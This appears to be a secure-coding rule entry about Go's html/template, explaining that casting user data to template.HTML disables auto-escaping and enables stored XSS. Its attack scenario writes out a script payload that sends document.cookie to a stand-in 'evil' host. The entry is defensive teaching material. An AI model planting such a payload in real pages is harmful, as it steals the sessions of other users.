name: html/template safe-type cast on user data (XSS)
attack_scenario: Attacker stores <script>fetch('//evil/?c='+document.cookie)</script> in their profile bio; because the value was wrapped in template.HTML it is emitted verbatim and runs in every viewer's session, exfiltrating cookies.
negative_test_hint: store bio = "<script>alert(1)</script>" and assert the rendered page HTML-escapes it instead of emitting it verbatim

exemplar.compliant: data.Body = userComment   // plain string; html/template auto-escapes it at {{.Body}}
exemplar.explanation: The template.HTML/JS/CSS/URL/HTMLAttr/Srcset/JSStr types tell html/template 'this is already safe, do not escape.' Casting a variable to one of them disables the exact auto-escaping that makes html/template safe; leaving user data as a plain string keeps the escaping intact.
